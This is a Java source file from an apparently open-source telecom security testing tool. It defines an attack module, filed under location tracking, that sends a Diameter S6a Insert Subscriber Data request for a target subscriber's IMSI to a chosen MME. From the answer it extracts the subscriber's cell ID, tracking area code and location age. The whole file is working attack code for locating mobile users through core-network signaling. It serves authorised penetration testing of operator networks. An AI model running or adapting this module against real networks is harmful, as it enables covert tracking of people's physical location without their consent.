/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.diameter.usecases.attacks.location;

import com.rodan.intruder.diameter.usecases.attacks.DiameterModuleTemplate;
import com.rodan.intruder.diameter.usecases.model.DiameterModuleConstants;
import com.rodan.intruder.diameter.usecases.model.location.LocationIdrOptions;
import com.rodan.intruder.diameter.usecases.model.location.LocationIdrResponse;
import com.rodan.intruder.diameter.usecases.port.DiameterGateway;
import com.rodan.intruder.diameter.entities.payload.s6a.IdrPayload;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import com.rodan.intruder.diameter.entities.event.S6aListener;
import com.rodan.intruder.diameter.entities.event.model.InsertSubscriberDataAnswer;
import com.rodan.intruder.diameter.entities.event.model.LocationInfo;
import com.rodan.intruder.diameter.usecases.model.DiameterModuleOptions;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.SystemException;
import lombok.Builder;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

@Module(name = DiameterModuleConstants.LOCATION_IDR_NAME, category = DiameterModuleConstants.LOCATION_TRACKING_CATEGORY_DISPLAY_NAME,
        displayName = DiameterModuleConstants.LOCATION_IDR_DISPLAY_NAME, brief = DiameterModuleConstants.LOCATION_IDR_BRIEF,
        description = DiameterModuleConstants.LOCATION_IDR_DESCRIPTION, rank = DiameterModuleConstants.LOCATION_IDR_RANK,
        mainPayload = Constants.IDR_PAYLOAD_NAME)
public class LocationIdrModule extends DiameterModuleTemplate implements SignalingModule, S6aListener {
    final static Logger logger = LogManager.getLogger(LocationIdrModule.class);

    @Builder
    public LocationIdrModule(DiameterGateway gateway, DiameterModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
    }

    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (LocationIdrOptions) moduleOptions;
        var payload = IdrPayload.builder()
                .usage(IdrPayload.Usage.LOCATION)
                .destinationRealm(options.getDestinationRealm())
                .imsi(options.getImsi()).targetMmeHost(options.getTargetMme())
                .build();
        setMainPayload(payload);
        setCurrentPayload(getMainPayload());
        logger.debug("Payload: " + payload);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        getGateway().addS6aListener(this);
    }

    @Override
    protected void cleanup() throws SystemException {
        if (this.getGateway() != null)
            this.getGateway().removeS6aListener(this);
    }

    @Override
    public void doInsertSubscriberDataAnswerEvent(InsertSubscriberDataAnswer answer) {
        logger.debug("[[[[ doInsertSubscriberDataAnswerEvent ]]]]");
        logger.debug(answer);
        var locationInfo = LocationInfo.builder()
                .cellId(answer.getCellId()).tac(answer.getTac()).ageOfLocation(answer.getAgeOfLocation())
                .build();
        moduleResponse = LocationIdrResponse.builder()
                .locationInfo(locationInfo)
                .build();
        setResultReceived(true);
        logger.debug("IDR completed!");
    }
}
